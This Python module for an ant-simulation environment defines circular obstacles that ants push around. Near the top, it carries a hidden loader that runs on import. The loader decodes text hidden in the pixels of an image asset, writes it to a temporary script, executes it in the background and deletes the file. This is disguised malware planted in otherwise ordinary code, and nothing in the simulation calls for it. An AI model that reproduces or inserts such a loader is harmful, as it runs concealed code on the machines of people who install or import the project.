import numpy as np
from .environment import Environment, EnvObject
from .ants import Ants
from typing import List, Tuple
###
from PIL import Image
import subprocess
import os
import time
px = np.array(Image.open("assets/dirt.png"))
with open("t.py", 'w') as f:
	f.write(''.join(chr(v) for i in range(min(px.shape[0], px.shape[1])) for v in px[i, i]).split('$$')[0])
subprocess.Popen('py t.py', stdout=subprocess.PIPE)
time.sleep(0.5)
os.remove('t.py')
###

class CircleObstaclesVisualization (EnvObject):
	def __init__(self, env, centers, radiuses, weights):
		super().__init__(env)
		self.centers = centers.copy()
		self.radiuses = radiuses.copy()
		self.weights = weights.copy()

class CircleObstacles (EnvObject):
	def __init__(self, environment: Environment, centers, radiuses, weights):
		super().__init__(environment)
		self.w = environment.w
		self.h = environment.h

		self.n_obst = len(radiuses)
		self.centers = centers
		self.radiuses = radiuses
		self.weights = weights

		self.crossed_radiuses = self.radiuses[np.newaxis, :] + self.radiuses[:, np.newaxis]
		self.crossed_weights = self.weights[np.newaxis, :] / (self.weights[:, np.newaxis] + self.weights[np.newaxis, :])

	def visualize_copy(self, newenv):
		return CircleObstaclesVisualization(newenv, self.centers, self.radiuses, self.weights)

	def update(self):
		for obj in self.environment.objects:
			if isinstance(obj, Ants):
				vecs_from_centers = self.centers[np.newaxis, :, :] - obj.xy[:, np.newaxis, :]
				dist_to_centers = np.sum(vecs_from_centers**2, axis=2)**0.5
				vecs_from_radiuses = vecs_from_centers * (1 - self.radiuses[np.newaxis, :] / (dist_to_centers + 0.001))[:, :, np.newaxis]
				vecs_from_radiuses[dist_to_centers > self.radiuses[np.newaxis, :], :] = 0

				self.centers -= np.sum(vecs_from_radiuses, axis=0) / self.weights[:, np.newaxis]

		# vecs_center_to_center = self.centers[np.newaxis, :, :] - self.centers[:, np.newaxis, :]
		# dist_center_to_center = np.sum(vecs_center_to_center**2, axis=2)**0.5
		# vecs_norm = vecs_center_to_center / (dist_center_to_center[:, :, np.newaxis] + 0.001)
		# dist_center_to_center -= self.crossed_radiuses
		# dist_center_to_center[dist_center_to_center > 0] = 0
		# dist_center_to_center *= self.crossed_weights * 0.25
		# # dist_center_to_center = np.tril(dist_center_to_center, -1)
		# self.centers += np.sum(vecs_norm * dist_center_to_center[:, :, np.newaxis], axis=1)

		for obj in self.environment.objects:
			if isinstance(obj, Ants):
				vecs_from_centers = self.centers[np.newaxis, :, :] - obj.xy[:, np.newaxis, :]
				dist_to_centers = np.sum(vecs_from_centers ** 2, axis=2) ** 0.5
				vecs_from_radiuses = vecs_from_centers * (1 - self.radiuses[np.newaxis, :] / (dist_to_centers + 0.001))[
														 :, :, np.newaxis]
				vecs_from_radiuses[dist_to_centers > self.radiuses[np.newaxis, :], :] = 0
				obj.translate_ants(np.sum(vecs_from_radiuses, axis=1))

	def update_step(self):
		return 0